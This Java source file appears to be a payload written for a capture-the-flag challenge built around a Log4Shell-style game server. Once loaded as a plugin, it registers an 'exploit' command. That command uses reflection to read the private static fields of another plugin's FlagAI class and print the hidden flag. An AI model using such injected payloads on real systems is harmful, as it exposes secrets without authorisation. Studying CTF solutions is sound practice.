package fr.thesmyler.log4shell.payloads;

import org.hallebarde.recrutement.api.Game;
import org.hallebarde.recrutement.api.Plugin;
import org.hallebarde.recrutement.api.PluginMetadata;
import org.hallebarde.recrutement.api.commands.CommandExecutor;

import java.lang.reflect.Field;
import java.lang.reflect.Modifier;
import java.util.logging.Logger;

public class GetFlagPayload implements Plugin {
    Logger logger;

    @Override
    public void onLoad(Game game, PluginMetadata metadata, Logger logger) {
        this.logger = logger;
        game.registerCommand("exploit", this::exploitCommand, "Get flag");
    }

    @Override
    public void onUnload(Game game) {

    }

    public void exploitCommand(Game game, CommandExecutor executor, String... args) {
        try {
            Class<?> clazz = game.getPlugins().get("npcs").getClass().getClassLoader().loadClass("org.hallebarde.npcsplugin.FlagAI");
            Field[] fields = clazz.getDeclaredFields();
            for (Field field: fields) {
                if (!Modifier.isStatic(field.getModifiers())) continue;
                field.setAccessible(true);
                executor.sendMessage((String) field.get(null));
            }
        } catch (ClassNotFoundException | IllegalAccessException e) {
            throw new RuntimeException(e);
        }
    }

}
